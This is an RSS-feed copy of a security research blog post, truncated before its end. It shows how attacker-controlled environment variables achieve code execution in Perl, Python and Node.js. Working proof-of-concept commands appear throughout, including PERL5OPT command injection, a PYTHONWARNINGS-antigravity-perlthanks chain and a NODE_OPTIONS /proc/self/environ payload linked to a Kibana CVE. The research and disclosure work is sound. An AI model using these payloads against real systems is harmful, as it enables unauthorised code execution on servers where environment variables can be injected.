<figure>
  <figcaption>Figure-0: arbitrary code execution achieved using an environment variable against perl running an empty script (/dev/null)</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>--env</span> <span>'PERL5OPT=-Mbase;print(`id`)'</span> perl:5.30.2 perl /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></figure>

</figure>



<p>Reading the <code>ENVIRONMENT VARIABLES</code> section of the <code>python(1)</code> man page, <code>PYTHONSTARTUP</code> initially appears like it may be a piece of a straightforward solution.
It allows specifying a path to a Python script that will be executed prior to displaying the prompt in interactive mode.
The interactive mode requirement didn‚Äôt seem like it would be an issue as the <code>PYTHONINSPECT</code> environment variable can be used to enter interactive mode, the same as specifying <code>-i</code> on the command line.
However, the documentation for the <code>-i</code> option explains that <code>PYTHONSTARTUP</code> will not be used when python is started with a script to execute.
This means that <code>PYTHONSTARTUP</code> and <code>PYTHONINSPECT</code> cannot be combined and <code>PYTHONSTARTUP</code> only has an effect when the python REPL is immediately launched.
This ultimately means that <code>PYTHONSTARTUP</code> is not viable as it has no effect when executing a regular Python script.</p>

<p>Other environment variables which looked promising were <code>PYTHONHOME</code> and <code>PYTHONPATH</code>. Both of these will let you gain arbitrary code execution but require you to also be able to create directories and files on the filesystem. It may be possible to loosen those requirements through the use of the proc filesystem and/or ZIP files.</p>

<p>The majority of the remaining environment variables are simply checked if they contain a non-empty string, and if so, toggle a generally benign setting. One of the rare exceptions to this is <code>PYTHONWARNINGS</code>.</p>

<h2 id="making-progress-with-pythonwarnings">Making progress with PYTHONWARNINGS</h2>
<p>The documentation for <code>PYTHONWARNINGS</code> states <code>it is equivalent to specifying the -W option</code>. The <code>-W</code> option is used for warning control to specify which warnings and how often they are printed. The full form of argument is <code>action:message:category:module:line</code>. While warning control didn‚Äôt seem like a promising lead, that quickly changed after checking the implementation.</p>

<figure>
  <figcaption>Figure-1: Python-3.8.2/Lib/warnings.py</figcaption>

<figure><pre><code data-lang="python"><span>[...]</span>
<span>def</span> <span>_getcategory</span><span>(</span><span>category</span><span>):</span>
    <span>if</span> <span>not</span> <span>category</span><span>:</span>
        <span>return</span> <span>Warning</span>
    <span>if</span> <span>'.'</span> <span>not</span> <span>in</span> <span>category</span><span>:</span>
        <span>import</span> <span>builtins</span> <span>as</span> <span>m</span>
        <span>klass</span> <span>=</span> <span>category</span>
    <span>else</span><span>:</span>
        <span>module</span><span>,</span> <span>_</span><span>,</span> <span>klass</span> <span>=</span> <span>category</span><span>.</span><span>rpartition</span><span>(</span><span>'.'</span><span>)</span>
        <span>try</span><span>:</span>
            <span>m</span> <span>=</span> <span>__import__</span><span>(</span><span>module</span><span>,</span> <span>None</span><span>,</span> <span>None</span><span>,</span> <span>[</span><span>klass</span><span>])</span>
        <span>except</span> <span>ImportError</span><span>:</span>
            <span>raise</span> <span>_OptionError</span><span>(</span><span>"invalid module name: %r"</span> <span>%</span> <span>(</span><span>module</span><span>,))</span> <span>from</span> <span>None</span>
<span>[...]</span></code></pre></figure>

</figure>

<p>The above code shows that as long as our specified category contains a dot, we can trigger the import an arbitrary Python module.</p>

<p>The next problem is that the vast majority of modules from Python‚Äôs standard library run very little code when imported. They tend to just define classes to be used later, and even when they provide code to run, the code is typically <a href="https://docs.python.org/3/library/__main__.html">guarded with a check of the <code>__main__</code> variable</a> (to detect if the file has been imported or run directly).</p>

<p>An unexpected exception to this is the <a href="https://xkcd.com/353/">antigravity module</a>. The Python developers included an <a href="https://en.wikipedia.org/wiki/Easter_egg_(media)">easter egg</a> in <a href="https://github.com/python/cpython/commit/206e3074d34aeb5a4d0c1e24d970b6569f7ad702">2008</a> which can be triggered by running <code>import antigravity</code>. This import will immediately open your browser to the xkcd comic that joked that <code>import antigravity</code> in Python would grant you the ability to fly.</p>

<p>As for how the <code>antigravity</code> module opens your browser, it uses another module from the standard library called <code>webbrowser</code>. This module checks your PATH for a large variety of browsers, including mosaic, opera, skipstone, konqueror, chrome, chromium, firefox, links, elinks and lynx. It also accepts an environment variable <code>BROWSER</code> that lets you specify which process should be executed. It is not possible to supply arguments to the process in the environment variable and the xkcd comic URL is the one hard-coded argument for the command.</p>

<p>The ability to turn this into arbitrary code execution depends on what other executables are available on the system.</p>

<h2 id="leveraging-perl-for-arbitrary-code-execution">Leveraging Perl for Arbitrary Code Execution</h2>

<p>One approach is to leverage Perl which is commonly installed on systems and is even available in the standard Python docker image. However, the <code>perl</code> binary cannot itself be used. This is because the first and only argument is the xkcd comic URL. The comic URL argument will cause an error and the process to exit without the <code>PERL5OPT</code> environment variable being used.</p>

<figure>
  <figcaption>Figure-2: PERL5OPT having no effect when a URL is passed to perl</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit'</span> perl:5.30.2 perl https://xkcd.com/353/
<span>Can't open perl script "https://xkcd.com/353/": No such file or directory</span></code></pre></figure>

</figure>

<p>Fortunately, when Perl is available it also common to have the default Perl scripts available, such as perldoc and perlthanks. These scripts will also error and exit with an invalid argument, but the error in this case happens later than the processing of the <code>PERL5OPT</code> environment variable. This means you can leverage the Perl environment variable payload detailed earlier in this blog post.</p>

<figure>
  <figcaption>Figure-3: PERL5OPT working as intended with perldoc and perlthanks</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit'</span> perl:5.30.2 perldoc https://xkcd.com/353/
<span>uid=0(root) gid=0(root) groups=0(root)
</span><span>$</span><span> </span>run <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit'</span> perl:5.30.2 perlthanks https://xkcd.com/353/
<span>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></figure>

</figure>

<h2 id="proof-of-concept-1">Proof of Concept</h2>

<figure>
  <figcaption>Figure-4: arbitrary code execution achieved using multiple environment variables against Python 2 and Python 3</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'PYTHONWARNINGS=all:0:antigravity.x:0:0'</span> <span>-e</span> <span>'BROWSER=perlthanks'</span> <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit;'</span> python:2.7.18 python /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)
Invalid -W option ignored: unknown warning category: 'antigravity.x'

</span><span>$</span><span> </span>docker run <span>-e</span> <span>'PYTHONWARNINGS=all:0:antigravity.x:0:0'</span> <span>-e</span> <span>'BROWSER=perlthanks'</span> <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit;'</span> python:3.8.2 python /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)
Invalid -W option ignored: unknown warning category: 'antigravity.x'</span></code></pre></figure>

</figure>



<p>A <a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">blog post</a> by <a href="https://twitter.com/securitymb">Micha≈Ç Bentkowski</a> provided a payload for exploiting Kibana (CVE-2019-7609). A prototype pollution vulnerability was used to set arbitrary environment variables which resulted in arbitrary command execution. Micha≈Ç‚Äôs payload used the <code>NODE_OPTIONS</code> environment variable and the <a href="https://en.wikipedia.org/wiki/Procfs">proc filesystem</a>, specifically <code>/proc/self/environ</code>.</p>

<p>Although Micha≈Ç‚Äôs technique was creative and worked perfectly for their vulnerability, the technique is not always guaranteed to work and has some constraints that would be nice to remove.</p>

<p>The first constraint is that it using <code>/proc/self/environ</code> is only viable if the contents can be made to be syntactically valid JavaScript. This requires being able to create an environment variable and have it appear first in the contents of <code>/proc/self/environ</code>, or knowing/bruteforcing the environment variable‚Äôs name that will appear first and overwriting it‚Äôs value.</p>

<p>Another constraint, as the first environment variable‚Äôs value finishes with a single line comment (<code>//</code>). Therefore, any newline character in other environment variables will likely cause a syntax error and prevent the payload from executing. The use of multi-line comments (<code>/*</code>) will not fix this issue as they must be closed to be syntactically valid. Therefore, in the rare case that an environment variable contains a newline character, it is required to know/bruteforce the environment variable‚Äôs name and overwrite it‚Äôs value to a new value that does not contain a newline.</p>

<p>Removing these contraints is an exercise left for the reader.</p>

<h2 id="proof-of-concept-2">Proof of Concept</h2>

<figure>
  <figcaption>Figure-5: achieving arbitrary code execution with environment variables against NodeJS by Micha≈Ç Bentkowski</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'NODE_VERSION=console.log(require("child_process").execSync("id").toString());//'</span> <span>-e</span> <span>'NODE_OPTIONS=--require /proc/self/environ'</span> node:14.2.0 node /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></figure>

</figure>



<p>If you run <code>ltrace -e getenv php /dev/null</code> you will find PHP uses the <code>PHPRC</code> environment variable.
The environment variable is used ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.elttam.com/blog/env/">https://www.elttam.com/blog/env/</a></em></p>]]>
            </description>
            <link>https://www.elttam.com/blog/env/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23827486</guid>
            <pubDate>Tue, 14 Jul 2020 01:07:25 GMT</pubDate>
        </item>
    </channel>
</rss>
